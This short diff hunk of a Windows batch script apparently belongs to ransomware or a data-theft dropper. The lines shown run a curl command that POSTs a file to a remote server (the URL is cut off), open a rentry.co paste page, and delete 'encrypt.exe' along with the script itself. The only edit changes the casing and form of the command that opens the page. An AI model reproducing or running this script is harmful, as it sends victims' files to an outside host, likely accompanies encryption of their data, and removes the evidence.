@@ -13,7 +13,7 @@ set "curl_command=curl -i -X POST -H "Content-Type: multipart/form-data" -F "fil
 echo Sending cURL command: %curl_command%
 %curl_command%
 
-start "" https://rentry.co/9kpphkvk
+START https://rentry.co/9kpphkvk
 
 rem Remove files and the script
 del encrypt.exe
